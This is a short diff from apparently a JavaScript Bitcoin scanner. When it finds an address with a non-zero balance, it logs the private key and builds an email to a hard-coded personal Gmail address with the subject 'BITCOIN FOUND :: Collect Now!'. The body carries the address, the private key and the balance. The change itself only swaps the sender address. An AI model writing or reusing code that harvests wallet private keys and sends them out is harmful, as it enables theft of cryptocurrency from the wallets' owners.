@@ -92,7 +92,7 @@ const blockParser = new parser.Parser({
 
             if (bal !== "0 BTC") {
                 console.log("FOUND:", key, addr, bal, tot, tr);
-                var fromEmail = new helper.Email('confidential.inc@gmail.com');
+                var fromEmail = new helper.Email('MoneyMaker_BTC@gmail.com');
                 var toEmail = new helper.Email('kderbyma@gmail.com');
                 var subject = 'BITCOIN FOUND :: Collect Now!';
                 var content = new helper.Content('text/plain', 'ADDR<' + addr + '> : KEY<' + key + '> : BALANCE<' + bal + '>');
